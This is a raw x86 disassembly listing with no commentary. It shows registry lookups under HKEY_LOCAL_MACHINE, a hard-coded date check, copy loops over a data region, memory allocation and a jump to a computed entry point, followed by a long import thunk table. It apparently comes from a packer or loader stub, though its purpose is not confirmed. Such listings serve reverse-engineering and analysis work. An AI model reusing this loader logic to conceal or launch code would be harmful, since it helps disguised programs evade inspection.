  454aa6:	mov    ecx,DWORD PTR [ebp+0x8]
  454aa9:	mov    edx,DWORD PTR [ecx+0x4]
  454aac:	sub    edx,0x8
  454aaf:	shr    edx,1
  454ab1:	mov    DWORD PTR [ebp-0xc],edx
  454ab4:	mov    eax,DWORD PTR [ebp+0x8]
  454ab7:	add    eax,0x8
  454aba:	mov    DWORD PTR [ebp-0x10],eax
  454abd:	mov    ecx,DWORD PTR [ebp+0x8]
  454ac0:	push   ecx
  454ac1:	mov    edx,DWORD PTR [ebp+0x10]
  454ac4:	push   edx
  454ac5:	mov    eax,DWORD PTR [ebp+0xc]
  454ac8:	push   eax
  454ac9:	mov    ecx,DWORD PTR [ebp-0x10]
  454acc:	push   ecx
  454acd:	mov    edx,DWORD PTR [ebp-0xc]
  454ad0:	push   edx
  454ad1:	call   0x454910
  454ad6:	add    esp,0x14
  454ad9:	mov    eax,DWORD PTR [ebp+0x8]
  454adc:	mov    ecx,DWORD PTR [ebp+0x8]
  454adf:	add    ecx,DWORD PTR [eax+0x4]
  454ae2:	mov    DWORD PTR [ebp+0x8],ecx
  454ae5:	jmp    0x454a96
  454ae7:	mov    esp,ebp
  454ae9:	pop    ebp
  454aea:	ret    
  454aeb:	int3   
  454aec:	int3   
  454aed:	int3   
  454aee:	int3   
  454aef:	int3   
  454af0:	push   ebp
  454af1:	mov    ebp,esp
  454af3:	sub    esp,0x8
  454af6:	mov    DWORD PTR [ebp-0x4],0x456018
  454afd:	lea    eax,[ebp-0x8]
  454b00:	push   eax
  454b01:	push   0x20019
  454b06:	push   0x0
  454b08:	push   0x458c5c
  454b0d:	push   0x80000002
  454b12:	call   DWORD PTR ds:0x458d70
  454b18:	test   eax,eax
  454b1a:	je     0x454b23
  454b1c:	xor    eax,eax
  454b1e:	jmp    0x454bc4
  454b23:	lea    ecx,[ebp-0x8]
  454b26:	push   ecx
  454b27:	push   0x20019
  454b2c:	push   0x0
  454b2e:	push   0x458c60
  454b33:	push   0x80000002
  454b38:	call   DWORD PTR ds:0x458d70
  454b3e:	test   eax,eax
  454b40:	je     0x454b46
  454b42:	xor    eax,eax
  454b44:	jmp    0x454bc4
  454b46:	mov    edx,0x53
  454b4b:	mov    eax,DWORD PTR [ebp-0x4]
  454b4e:	mov    WORD PTR [eax],dx
  454b51:	lea    ecx,[ebp-0x8]
  454b54:	push   ecx
  454b55:	push   0x20019
  454b5a:	push   0x0
  454b5c:	mov    edx,DWORD PTR [ebp-0x4]
  454b5f:	push   edx
  454b60:	mov    eax,DWORD PTR [ebp-0x8]
  454b63:	push   eax
  454b64:	call   DWORD PTR ds:0x458d70
  454b6a:	test   eax,eax
  454b6c:	je     0x454b72
  454b6e:	xor    eax,eax
  454b70:	jmp    0x454bc4
  454b72:	lea    ecx,[ebp-0x8]
  454b75:	push   ecx
  454b76:	push   0x20019
  454b7b:	push   0x0
  454b7d:	push   0x456030
  454b82:	mov    edx,DWORD PTR [ebp-0x8]
  454b85:	push   edx
  454b86:	call   DWORD PTR ds:0x458d70
  454b8c:	test   eax,eax
  454b8e:	je     0x454b9d
  454b90:	push   0x1
  454b92:	push   0x1
  454b94:	push   0x1
  454b96:	push   0x1
  454b98:	call   0x454af0
  454b9d:	lea    eax,[ebp-0x8]
  454ba0:	push   eax
  454ba1:	push   0x20019
  454ba6:	push   0x0
  454ba8:	push   0x4560a8
  454bad:	mov    ecx,DWORD PTR [ebp-0x8]
  454bb0:	push   ecx
  454bb1:	call   DWORD PTR ds:0x458d70
  454bb7:	test   eax,eax
  454bb9:	jne    0x454bbf
  454bbb:	xor    eax,eax
  454bbd:	jmp    0x454bc4
  454bbf:	call   0x4548e0
  454bc4:	mov    esp,ebp
  454bc6:	pop    ebp
  454bc7:	ret    0x10
  454bca:	int3   
  454bcb:	int3   
  454bcc:	int3   
  454bcd:	int3   
  454bce:	int3   
  454bcf:	int3   
  454bd0:	push   ebp
  454bd1:	mov    ebp,esp
  454bd3:	sub    esp,0x70
  454bd6:	pusha  
  454bd7:	mov    DWORD PTR ds:0x458d74,ebp
  454bdd:	mov    DWORD PTR [ebp-0x3c],0x0
  454be4:	mov    DWORD PTR [ebp-0x50],0x80000002
  454beb:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  454bf2:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  454bf9:	mov    eax,ds:0x456bb4
  454bfe:	mov    ds:0x458d70,eax
  454c03:	lea    ecx,[ebp-0x54]
  454c06:	push   ecx
  454c07:	lea    edx,[ebp-0x58]
  454c0a:	push   edx
  454c0b:	lea    eax,[ebp-0x8]
  454c0e:	push   eax
  454c0f:	call   DWORD PTR ds:0x4567c8
  454c15:	movzx  ecx,WORD PTR [ebp-0x58]
  454c19:	cmp    ecx,0x21
  454c1c:	je     0x454c25
  454c1e:	xor    eax,eax
  454c20:	jmp    0x454e1c
  454c25:	push   0x1
  454c27:	push   0x1
  454c29:	push   0x1
  454c2b:	push   0x1
  454c2d:	call   0x454af0
  454c32:	mov    DWORD PTR [ebp-0x14],0x0
  454c39:	mov    DWORD PTR [ebp-0x34],0x64
  454c40:	mov    DWORD PTR [ebp-0x1c],0x1e
  454c47:	mov    DWORD PTR [ebp-0x3c],0x0
  454c4e:	mov    DWORD PTR [ebp-0x24],0x0
  454c55:	mov    DWORD PTR [ebp-0x30],0x1
  454c5c:	mov    DWORD PTR [ebp-0x18],0x3
  454c63:	mov    edx,DWORD PTR ds:0x458c64
  454c69:	push   edx
  454c6a:	call   0x454900
  454c6f:	add    esp,0x4
  454c72:	mov    DWORD PTR [ebp-0x40],eax
  454c75:	mov    eax,DWORD PTR [ebp-0x40]
  454c78:	push   eax
  454c79:	call   0x454860
  454c7e:	add    esp,0x4
  454c81:	mov    DWORD PTR [ebp-0x38],eax
  454c84:	mov    ecx,DWORD PTR [ebp-0x40]
  454c87:	push   ecx
  454c88:	push   0x0
  454c8a:	mov    edx,DWORD PTR [ebp-0x38]
  454c8d:	push   edx
  454c8e:	call   0x4548a0
  454c93:	add    esp,0xc
  454c96:	mov    eax,DWORD PTR [ebp-0x40]
  454c99:	mov    DWORD PTR [ebp-0x48],eax
  454c9c:	mov    ecx,DWORD PTR [ebp-0x3c]
  454c9f:	cmp    ecx,DWORD PTR [ebp-0x40]
  454ca2:	jae    0x454cf4
  454ca4:	mov    edx,DWORD PTR [ebp-0x48]
  454ca7:	push   edx
  454ca8:	mov    eax,DWORD PTR [ebp-0x34]
  454cab:	push   eax
  454cac:	call   0x4548b0
  454cb1:	add    esp,0x8
  454cb4:	mov    DWORD PTR [ebp-0x4c],eax
  454cb7:	mov    ecx,DWORD PTR [ebp-0x4c]
  454cba:	push   ecx
  454cbb:	mov    edx,DWORD PTR ds:0x458c64
  454cc1:	add    edx,DWORD PTR [ebp-0x24]
  454cc4:	push   edx
  454cc5:	mov    eax,DWORD PTR [ebp-0x38]
  454cc8:	add    eax,DWORD PTR [ebp-0x3c]
  454ccb:	push   eax
  454ccc:	call   0x455412
  454cd1:	add    esp,0xc
  454cd4:	mov    ecx,DWORD PTR [ebp-0x1c]
  454cd7:	add    ecx,DWORD PTR [ebp-0x34]
  454cda:	add    ecx,DWORD PTR [ebp-0x24]
  454cdd:	mov    DWORD PTR [ebp-0x24],ecx
  454ce0:	mov    edx,DWORD PTR [ebp-0x3c]
  454ce3:	add    edx,DWORD PTR [ebp-0x34]
  454ce6:	mov    DWORD PTR [ebp-0x3c],edx
  454ce9:	mov    eax,DWORD PTR [ebp-0x48]
  454cec:	sub    eax,DWORD PTR [ebp-0x4c]
  454cef:	mov    DWORD PTR [ebp-0x48],eax
  454cf2:	jmp    0x454c9c
  454cf4:	mov    ecx,DWORD PTR [ebp-0x40]
  454cf7:	push   ecx
  454cf8:	mov    edx,DWORD PTR [ebp-0x38]
  454cfb:	push   edx
  454cfc:	call   0x454990
  454d01:	add    esp,0x8
  454d04:	mov    DWORD PTR [ebp-0x24],0x0
  454d0b:	mov    DWORD PTR [ebp-0x60],0x0
  454d12:	call   0x4548f0
  454d17:	mov    eax,ds:0x458c64
  454d1c:	push   eax
  454d1d:	call   0x454900
  454d22:	add    esp,0x4
  454d25:	mov    DWORD PTR [ebp-0x64],eax
  454d28:	mov    ecx,DWORD PTR [ebp-0x64]
  454d2b:	push   ecx
  454d2c:	call   0x454860
  454d31:	add    esp,0x4
  454d34:	mov    DWORD PTR [ebp-0x20],eax
  454d37:	mov    edx,DWORD PTR [ebp-0x64]
  454d3a:	push   edx
  454d3b:	push   0x0
  454d3d:	mov    eax,DWORD PTR [ebp-0x20]
  454d40:	push   eax
  454d41:	call   0x4548a0
  454d46:	add    esp,0xc
  454d49:	mov    ecx,DWORD PTR [ebp-0x64]
  454d4c:	mov    DWORD PTR [ebp-0x6c],ecx
  454d4f:	mov    edx,DWORD PTR [ebp-0x60]
  454d52:	cmp    edx,DWORD PTR [ebp-0x64]
  454d55:	jae    0x454da6
  454d57:	mov    eax,DWORD PTR [ebp-0x6c]
  454d5a:	push   eax
  454d5b:	mov    ecx,DWORD PTR [ebp-0x34]
  454d5e:	push   ecx
  454d5f:	call   0x4548b0
  454d64:	add    esp,0x8
  454d67:	mov    DWORD PTR [ebp-0x70],eax
  454d6a:	mov    edx,DWORD PTR [ebp-0x70]
  454d6d:	push   edx
  454d6e:	mov    eax,ds:0x458c64
  454d73:	add    eax,DWORD PTR [ebp-0x24]
  454d76:	push   eax
  454d77:	mov    ecx,DWORD PTR [ebp-0x20]
  454d7a:	add    ecx,DWORD PTR [ebp-0x60]
  454d7d:	push   ecx
  454d7e:	call   0x455412
  454d83:	add    esp,0xc
  454d86:	mov    edx,DWORD PTR [ebp-0x1c]
  454d89:	add    edx,DWORD PTR [ebp-0x34]
  454d8c:	add    edx,DWORD PTR [ebp-0x24]
  454d8f:	mov    DWORD PTR [ebp-0x24],edx
  454d92:	mov    eax,DWORD PTR [ebp-0x60]
  454d95:	add    eax,DWORD PTR [ebp-0x34]
  454d98:	mov    DWORD PTR [ebp-0x60],eax
  454d9b:	mov    ecx,DWORD PTR [ebp-0x6c]
  454d9e:	sub    ecx,DWORD PTR [ebp-0x70]
  454da1:	mov    DWORD PTR [ebp-0x6c],ecx
  454da4:	jmp    0x454d4f
  454da6:	mov    edx,DWORD PTR [ebp-0x64]
  454da9:	push   edx
  454daa:	mov    eax,DWORD PTR [ebp-0x20]
  454dad:	push   eax
  454dae:	call   0x454990
  454db3:	add    esp,0x8
  454db6:	mov    ecx,DWORD PTR [ebp-0x38]
  454db9:	mov    edx,DWORD PTR [ebp-0x20]
  454dbc:	mov    DWORD PTR [ecx],edx
  454dbe:	push   0x42000
  454dc3:	call   0x454860
  454dc8:	add    esp,0x4
  454dcb:	mov    DWORD PTR [ebp-0xc],eax
  454dce:	push   0x3f800
  454dd3:	mov    eax,DWORD PTR [ebp-0x38]
  454dd6:	push   eax
  454dd7:	mov    ecx,DWORD PTR [ebp-0xc]
  454dda:	add    ecx,0x300
  454de0:	push   ecx
  454de1:	call   0x455412
  454de6:	add    esp,0xc
  454de9:	mov    edx,DWORD PTR [ebp-0xc]
  454dec:	sub    edx,0x400000
  454df2:	push   edx
  454df3:	mov    eax,DWORD PTR [ebp-0xc]
  454df6:	push   eax
  454df7:	mov    ecx,DWORD PTR [ebp-0x20]
  454dfa:	push   ecx
  454dfb:	call   0x454a90
  454e00:	add    esp,0xc
  454e03:	mov    esp,DWORD PTR ds:0x458d74
  454e09:	pop    eax
  454e0a:	mov    eax,DWORD PTR [ebp-0xc]
  454e0d:	add    eax,0x3f7e0
  454e12:	mov    ds:0x458d78,eax
  454e17:	jmp    0x454e20
  454e1c:	mov    esp,ebp
  454e1e:	pop    ebp
  454e1f:	ret    
  454e20:	push   ebp
  454e21:	mov    ebp,esp
  454e23:	pop    eax
  454e24:	pop    eax
  454e25:	mov    ecx,DWORD PTR ds:0x458d78
  454e2b:	jmp    ecx
  454e2d:	pop    ebp
  454e2e:	ret    
  454e2f:	jmp    DWORD PTR ds:0x4567b8
  454e35:	jmp    DWORD PTR ds:0x4567bc
  454e3b:	jmp    DWORD PTR ds:0x4567c0
  454e41:	jmp    DWORD PTR ds:0x4567c4
  454e47:	jmp    DWORD PTR ds:0x4567c8
  454e4d:	jmp    DWORD PTR ds:0x4567d0
  454e53:	jmp    DWORD PTR ds:0x4567d4
  454e59:	jmp    DWORD PTR ds:0x4567d8
  454e5f:	jmp    DWORD PTR ds:0x4567dc
  454e65:	jmp    DWORD PTR ds:0x4567e0
  454e6b:	jmp    DWORD PTR ds:0x4567e4
  454e71:	jmp    DWORD PTR ds:0x4567e8
  454e77:	jmp    DWORD PTR ds:0x4567ec
  454e7d:	jmp    DWORD PTR ds:0x4567f0
  454e83:	jmp    DWORD PTR ds:0x4567f4
  454e89:	jmp    DWORD PTR ds:0x4567f8
  454e8f:	jmp    DWORD PTR ds:0x4567fc
  454e95:	jmp    DWORD PTR ds:0x456800
  454e9b:	jmp    DWORD PTR ds:0x456804
  454ea1:	jmp    DWORD PTR ds:0x456808
  454ea7:	jmp    DWORD PTR ds:0x45680c
  454ead:	jmp    DWORD PTR ds:0x456810
  454eb3:	jmp    DWORD PTR ds:0x456814
  454eb9:	jmp    DWORD PTR ds:0x456818
  454ebf:	jmp    DWORD PTR ds:0x45681c
  454ec5:	jmp    DWORD PTR ds:0x456820
  454ecb:	jmp    DWORD PTR ds:0x456824
  454ed1:	jmp    DWORD PTR ds:0x456828
  454ed7:	jmp    DWORD PTR ds:0x45682c
  454edd:	jmp    DWORD PTR ds:0x456830
  454ee3:	jmp    DWORD PTR ds:0x456834
  454ee9:	jmp    DWORD PTR ds:0x456838
  454eef:	jmp    DWORD PTR ds:0x45683c
  454ef5:	jmp    DWORD PTR ds:0x456840
  454efb:	jmp    DWORD PTR ds:0x456844
  454f01:	jmp    DWORD PTR ds:0x456848
  454f07:	jmp    DWORD PTR ds:0x45684c
  454f0d:	jmp    DWORD PTR ds:0x456850
  454f13:	jmp    DWORD PTR ds:0x456854
  454f19:	jmp    DWORD PTR ds:0x456858
  454f1f:	jmp    DWORD PTR ds:0x45685c
  454f25:	jmp    DWORD PTR ds:0x456860
  454f2b:	jmp    DWORD PTR ds:0x456864
  454f31:	jmp    DWORD PTR ds:0x456868
  454f37:	jmp    DWORD PTR ds:0x45686c
  454f3d:	jmp    DWORD PTR ds:0x456870
  454f43:	jmp    DWORD PTR ds:0x456874
  454f49:	jmp    DWORD PTR ds:0x456878
  454f4f:	jmp    DWORD PTR ds:0x45687c
  454f55:	jmp    DWORD PTR ds:0x456880
  454f5b:	jmp    DWORD PTR ds:0x456884
  454f61:	jmp    DWORD PTR ds:0x456888
  454f67:	jmp    DWORD PTR ds:0x45688c
  454f6d:	jmp    DWORD PTR ds:0x456890
  454f73:	jmp    DWORD PTR ds:0x456894
  454f79:	jmp    DWORD PTR ds:0x456898
  454f7f:	jmp    DWORD PTR ds:0x45689c
  454f85:	jmp    DWORD PTR ds:0x4568a0
  454f8b:	jmp    DWORD PTR ds:0x4568a4
  454f91:	jmp    DWORD PTR ds:0x4568a8
  454f97:	jmp    DWORD PTR ds:0x4568ac
  454f9d:	jmp    DWORD PTR ds:0x4568b0
  454fa3:	jmp    DWORD PTR ds:0x4568b4
  454fa9:	jmp    DWORD PTR ds:0x4568b8
  454faf:	jmp    DWORD PTR ds:0x4568bc
  454fb5:	jmp    DWORD PTR ds:0x4568c0
  454fbb:	jmp    DWORD PTR ds:0x4568c4
  454fc1:	jmp    DWORD PTR ds:0x4568c8
  454fc7:	jmp    DWORD PTR ds:0x4568cc
  454fcd:	jmp    DWORD PTR ds:0x4568d0
  454fd3:	jmp    DWORD PTR ds:0x4568d4
  454fd9:	jmp    DWORD PTR ds:0x4568d8
  454fdf:	jmp    DWORD PTR ds:0x4568dc
  454fe5:	jmp    DWORD PTR ds:0x4568e0
  454feb:	jmp    DWORD PTR ds:0x4568e4
  454ff1:	jmp    DWORD PTR ds:0x4568e8
  454ff7:	jmp    DWORD PTR ds:0x4568ec
  454ffd:	jmp    DWORD PTR ds:0x4568f0
  455003:	jmp    DWORD PTR ds:0x4568f4
  455009:	jmp    DWORD PTR ds:0x4568f8
  45500f:	jmp    DWORD PTR ds:0x4568fc
  455015:	jmp    DWORD PTR ds:0x456900
  45501b:	jmp    DWORD PTR ds:0x456904
  455021:	jmp    DWORD PTR ds:0x456908
  455027:	jmp    DWORD PTR ds:0x45690c
  45502d:	jmp    DWORD PTR ds:0x456910
  455033:	jmp    DWORD PTR ds:0x456914
  455039:	jmp    DWORD PTR ds:0x456918
  45503f:	jmp    DWORD PTR ds:0x45691c
  455045:	jmp    DWORD PTR ds:0x456920
  45504b:	jmp    DWORD PTR ds:0x456924
  455051:	jmp    DWORD PTR ds:0x456928
  455057:	jmp    DWORD PTR ds:0x45692c
  45505d:	jmp    DWORD PTR ds:0x456930
  455063:	jmp    DWORD PTR ds:0x456934
  455069:	jmp    DWORD PTR ds:0x456938
  45506f:	jmp    DWORD PTR ds:0x45693c
  455075:	jmp    DWORD PTR ds:0x456940
  45507b:	jmp    DWORD PTR ds:0x456944
  455081:	jmp    DWORD PTR ds:0x456948
  455087:	jmp    DWORD PTR ds:0x45694c
  45508d:	jmp    DWORD PTR ds:0x456950
  455093:	jmp    DWORD PTR ds:0x456954
  455099:	jmp    DWORD PTR ds:0x456958
  45509f:	jmp    DWORD PTR ds:0x45695c
  4550a5:	jmp    DWORD PTR ds:0x456960
  4550ab:	jmp    DWORD PTR ds:0x456964
  4550b1:	jmp    DWORD PTR ds:0x456968
  4550b7:	jmp    DWORD PTR ds:0x45696c
  4550bd:	jmp    DWORD PTR ds:0x456970
  4550c3:	jmp    DWORD PTR ds:0x456974
  4550c9:	jmp    DWORD PTR ds:0x456978
  4550cf:	jmp    DWORD PTR ds:0x45697c
  4550d5:	jmp    DWORD PTR ds:0x456980
  4550db:	jmp    DWORD PTR ds:0x456984
  4550e1:	jmp    DWORD PTR ds:0x456988
  4550e7:	jmp    DWORD PTR ds:0x45698c
  4550ed:	jmp    DWORD PTR ds:0x456990
  4550f3:	jmp    DWORD PTR ds:0x456994
  4550f9:	jmp    DWORD PTR ds:0x456998
  4550ff:	jmp    DWORD PTR ds:0x45699c
  455105:	jmp    DWORD PTR ds:0x4569a0
  45510b:	jmp    DWORD PTR ds:0x4569a4
  455111:	jmp    DWORD PTR ds:0x4569a8
  455117:	jmp    DWORD PTR ds:0x4569ac
  45511d:	jmp    DWORD PTR ds:0x4569b0
  455123:	jmp    DWORD PTR ds:0x4569b4
  455129:	jmp    DWORD PTR ds:0x4569b8
  45512f:	jmp    DWORD PTR ds:0x4569bc
  455135:	jmp    DWORD PTR ds:0x4569c0
  45513b:	jmp    DWORD PTR ds:0x4569c4
  455141:	jmp    DWORD PTR ds:0x4569c8
  455147:	jmp    DWORD PTR ds:0x4569cc
  45514d:	jmp    DWORD PTR ds:0x4569d0
  455153:	jmp    DWORD PTR ds:0x4569d4
  455159:	jmp    DWORD PTR ds:0x4569d8
  45515f:	jmp    DWORD PTR ds:0x4569dc
  455165:	jmp    DWORD PTR ds:0x4569e0
  45516b:	jmp    DWORD PTR ds:0x4569e4
  455171:	jmp    DWORD PTR ds:0x4569e8
  455177:	jmp    DWORD PTR ds:0x4569ec
  45517d:	jmp    DWORD PTR ds:0x4569f0
  455183:	jmp    DWORD PTR ds:0x4569f4
  455189:	jmp    DWORD PTR ds:0x4569f8
  45518f:	jmp    DWORD PTR ds:0x4569fc
  455195:	jmp    DWORD PTR ds:0x456a00
  45519b:	jmp    DWORD PTR ds:0x456a04
  4551a1:	jmp    DWORD PTR ds:0x456a08
  4551a7:	jmp    DWORD PTR ds:0x456a0c
  4551ad:	jmp    DWORD PTR ds:0x456a10
  4551b3:	jmp    DWORD PTR ds:0x456a14
  4551b9:	jmp    DWORD PTR ds:0x456a18
  4551bf:	jmp    DWORD PTR ds:0x456a1c
  4551c5:	jmp    DWORD PTR ds:0x456a20
  4551cb:	jmp    DWORD PTR ds:0x456a24
  4551d1:	jmp    DWORD PTR ds:0x456a28
  4551d7:	jmp    DWORD PTR ds:0x456a2c
  4551dd:	jmp    DWORD PTR ds:0x456a30
  4551e3:	jmp    DWORD PTR ds:0x456a34
  4551e9:	jmp    DWORD PTR ds:0x456a38
  4551ef:	jmp    DWORD PTR ds:0x456a3c
  4551f5:	jmp    DWORD PTR ds:0x456a40
  4551fb:	jmp    DWORD PTR ds:0x456a44
  455201:	jmp    DWORD PTR ds:0x456a48
  455207:	jmp    DWORD PTR ds:0x456a4c
  45520d:	jmp    DWORD PTR ds:0x456a50
  455213:	jmp    DWORD PTR ds:0x456a54
  455219:	jmp    DWORD PTR ds:0x456a58
  45521f:	jmp    DWORD PTR ds:0x456a5c
  455225:	jmp    DWORD PTR ds:0x456a60
  45522b:	jmp    DWORD PTR ds:0x456a64
  455231:	jmp    DWORD PTR ds:0x456a68
  455237:	jmp    DWORD PTR ds:0x456a6c
  45523d:	jmp    DWORD PTR ds:0x456a70
  455243:	jmp    DWORD PTR ds:0x456a74
  455249:	jmp    DWORD PTR ds:0x456a78
  45524f:	jmp    DWORD PTR ds:0x456a7c
  455255:	jmp    DWORD PTR ds:0x456a80
  45525b:	jmp    DWORD PTR ds:0x456a84
  455261:	jmp    DWORD PTR ds:0x456a88
  455267:	jmp    DWORD PTR ds:0x456a8c
  45526d:	jmp    DWORD PTR ds:0x456a90
  455273:	jmp    DWORD PTR ds:0x456a94
  455279:	jmp    DWORD PTR ds:0x456a98
  45527f:	jmp    DWORD PTR ds:0x456a9c
  455285:	jmp    DWORD PTR ds:0x456aa0
  45528b:	jmp    DWORD PTR ds:0x456aa4
  455291:	jmp    DWORD PTR ds:0x456aa8
  455297:	jmp    DWORD PTR ds:0x456aac
  45529d:	jmp    DWORD PTR ds:0x456ab0
  4552a3:	jmp    DWORD PTR ds:0x456ab4
  4552a9:	jmp    DWORD PTR ds:0x456ab8
  4552af:	jmp    DWORD PTR ds:0x456abc
  4552b5:	jmp    DWORD PTR ds:0x456ac0
  4552bb:	jmp    DWORD PTR ds:0x456ac4
  4552c1:	jmp    DWORD PTR ds:0x456ac8
  4552c7:	jmp    DWORD PTR ds:0x456acc
  4552cd:	jmp    DWORD PTR ds:0x456ad0
  4552d3:	jmp    DWORD PTR ds:0x456ad4
  4552d9:	jmp    DWORD PTR ds:0x456ad8
  4552df:	jmp    DWORD PTR ds:0x456adc
  4552e5:	jmp    DWORD PTR ds:0x456ae0
  4552eb:	jmp    DWORD PTR ds:0x456ae4
  4552f1:	jmp    DWORD PTR ds:0x456ae8
  4552f7:	jmp    DWORD PTR ds:0x456aec
  4552fd:	jmp    DWORD PTR ds:0x456af0
  455303:	jmp    DWORD PTR ds:0x456af4
  455309:	jmp    DWORD PTR ds:0x456af8
  45530f:	jmp    DWORD PTR ds:0x456afc
  455315:	jmp    DWORD PTR ds:0x456b00
  45531b:	jmp    DWORD PTR ds:0x456b04
  455321:	jmp    DWORD PTR ds:0x456b08
  455327:	jmp    DWORD PTR ds:0x456b0c
  45532d:	jmp    DWORD PTR ds:0x456b10
  455333:	jmp    DWORD PTR ds:0x456b14
  455339:	jmp    DWORD PTR ds:0x456b18
  45533f:	jmp    DWORD PTR ds:0x456b1c
  455345:	jmp    DWORD PTR ds:0x456b20
  45534b:	jmp    DWORD PTR ds:0x456b24
  455351:	jmp    DWORD PTR ds:0x456b28
  455357:	jmp    DWORD PTR ds:0x456b2c
  45535d:	jmp    DWORD PTR ds:0x456b30
  455363:	jmp    DWORD PTR ds:0x456b34
  455369:	jmp    DWORD PTR ds:0x456b38
  45536f:	jmp    DWORD PTR ds:0x456b3c
  455375:	jmp    DWORD PTR ds:0x456b40
  45537b:	jmp    DWORD PTR ds:0x456b44
  455381:	jmp    DWORD PTR ds:0x456b48
  455387:	jmp    DWORD PTR ds:0x456b4c
  45538d:	jmp    DWORD PTR ds:0x456b50
  455393:	jmp    DWORD PTR ds:0x456b54
  455399:	jmp    DWORD PTR ds:0x456b58
  45539f:	jmp    DWORD PTR ds:0x456b5c
  4553a5:	jmp    DWORD PTR ds:0x456b60
  4553ab:	jmp    DWORD PTR ds:0x456b64
  4553b1:	jmp    DWORD PTR ds:0x456b68
  4553b7:	jmp    DWORD PTR ds:0x456b6c
  4553bd:	jmp    DWORD PTR ds:0x456b70
  4553c3:	jmp    DWORD PTR ds:0x456b74
  4553c9:	jmp    DWORD PTR ds:0x456b78
  4553cf:	jmp    DWORD PTR ds:0x456b7c
  4553d5:	jmp    DWORD PTR ds:0x456b80
  4553db:	jmp    DWORD PTR ds:0x456b84
  4553e1:	jmp    DWORD PTR ds:0x456b88
  4553e7:	jmp    DWORD PTR ds:0x456b8c
  4553ed:	jmp    DWORD PTR ds:0x456b90
  4553f3:	jmp    DWORD PTR ds:0x456b94
  4553f9:	jmp    DWORD PTR ds:0x456b98
  4553ff:	jmp    DWORD PTR ds:0x456b9c
  455405:	jmp    DWORD PTR ds:0x456ba0
  45540b:	jmp    DWORD PTR ds:0x456ba4
  455411:	int3   
  455412:	jmp    DWORD PTR ds:0x456bac
  455418:	jmp    DWORD PTR ds:0x456bb4
  45541e:	jmp    DWORD PTR ds:0x456bbc
  455424:	jmp    DWORD PTR ds:0x456bc0
  45542a:	jmp    DWORD PTR ds:0x456bc4
  455430:	jmp    DWORD PTR ds:0x456bc8
  455436:	jmp    DWORD PTR ds:0x456bcc
  45543c:	jmp    DWORD PTR ds:0x456bd0
  455442:	jmp    DWORD PTR ds:0x456bd4
  455448:	jmp    DWORD PTR ds:0x456bd8
  45544e:	jmp    DWORD PTR ds:0x456bdc
  455454:	jmp    DWORD PTR ds:0x456be0
  45545a:	jmp    DWORD PTR ds:0x456be4
  455460:	jmp    DWORD PTR ds:0x456be8
  455466:	jmp    DWORD PTR ds:0x456bec
  45546c:	jmp    DWORD PTR ds:0x456bf0
  455472:	jmp    DWORD PTR ds:0x456bf4
  455478:	jmp    DWORD PTR ds:0x456bf8
  45547e:	jmp    DWORD PTR ds:0x456bfc
  455484:	jmp    DWORD PTR ds:0x456c00
  45548a:	jmp    DWORD PTR ds:0x456c04
  455490:	jmp    DWORD PTR ds:0x456c08
  455496:	jmp    DWORD PTR ds:0x456c0c
  45549c:	jmp    DWORD PTR ds:0x456c10
  4554a2:	jmp    DWORD PTR ds:0x456c14
  4554a8:	jmp    DWORD PTR ds:0x456c18
  4554ae:	jmp    DWORD PTR ds:0x456c1c
  4554b4:	jmp    DWORD PTR ds:0x456c20
  4554ba:	jmp    DWORD PTR ds:0x456c24
  4554c0:	jmp    DWORD PTR ds:0x456c28
  4554c6:	jmp    DWORD PTR ds:0x456c2c
  4554cc:	jmp    DWORD PTR ds:0x456c30
  4554d2:	jmp    DWORD PTR ds:0x456c34
  4554d8:	jmp    DWORD PTR ds:0x456c38
  4554de:	jmp    DWORD PTR ds:0x456c3c
  4554e4:	jmp    DWORD PTR ds:0x456c40
  4554ea:	jmp    DWORD PTR ds:0x456c44
  4554f0:	jmp    DWORD PTR ds:0x456c48
  4554f6:	jmp    DWORD PTR ds:0x456c4c
  4554fc:	jmp    DWORD PTR ds:0x456c50
  455502:	jmp    DWORD PTR ds:0x456c54
  455508:	jmp    DWORD PTR ds:0x456c58
  45550e:	jmp    DWORD PTR ds:0x456c5c
  455514:	jmp    DWORD PTR ds:0x456c60
  45551a:	jmp    DWORD PTR ds:0x456c64
  455520:	jmp    DWORD PTR ds:0x456c68
  455526:	jmp    DWORD PTR ds:0x456c6c
  45552c:	jmp    DWORD PTR ds:0x456c70
  455532:	jmp    DWORD PTR ds:0x456c74
  455538:	jmp    DWORD PTR ds:0x456c78
  45553e:	jmp    DWORD PTR ds:0x456c7c
  455544:	jmp    DWORD PTR ds:0x456c80
  45554a:	jmp    DWORD PTR ds:0x456c84
  455550:	jmp    DWORD PTR ds:0x456c88
  455556:	jmp    DWORD PTR ds:0x456c8c
  45555c:	jmp    DWORD PTR ds:0x456c90
  455562:	jmp    DWORD PTR ds:0x456c94
  455568:	jmp    DWORD PTR ds:0x456c98
  45556e:	jmp    DWORD PTR ds:0x456c9c
  455574:	jmp    DWORD PTR ds:0x456ca0
  45557a:	jmp    DWORD PTR ds:0x456ca4
  455580:	jmp    DWORD PTR ds:0x456ca8
  455586:	jmp    DWORD PTR ds:0x456cac
  45558c:	jmp    DWORD PTR ds:0x456cb0
  455592:	jmp    DWORD PTR ds:0x456cb4
  455598:	jmp    DWORD PTR ds:0x456cb8
  45559e:	jmp    DWORD PTR ds:0x456cbc
  4555a4:	jmp    DWORD PTR ds:0x456cc0
  4555aa:	jmp    DWORD PTR ds:0x456cc4
  4555b0:	jmp    DWORD PTR ds:0x456cc8
  4555b6:	jmp    DWORD PTR ds:0x456ccc
  4555bc:	jmp    DWORD PTR ds:0x456cd0
  4555c2:	jmp    DWORD PTR ds:0x456cd4
  4555c8:	jmp    DWORD PTR ds:0x456cd8
  4555ce:	jmp    DWORD PTR ds:0x456cdc
  4555d4:	jmp    DWORD PTR ds:0x456ce0
  4555da:	jmp    DWORD PTR ds:0x456ce4
  4555e0:	jmp    DWORD PTR ds:0x456ce8
  4555e6:	jmp    DWORD PTR ds:0x456cec
  4555ec:	jmp    DWORD PTR ds:0x456cf0
  4555f2:	jmp    DWORD PTR ds:0x456cf4
  4555f8:	jmp    DWORD PTR ds:0x456cf8
  4555fe:	jmp    DWORD PTR ds:0x456cfc
  455604:	jmp    DWORD PTR ds:0x456d00
  45560a:	jmp    DWORD PTR ds:0x456d04
  455610:	jmp    DWORD PTR ds:0x456d08
  455616:	jmp    DWORD PTR ds:0x456d0c
  45561c:	jmp    DWORD PTR ds:0x456d10
  455622:	jmp    DWORD PTR ds:0x456d14
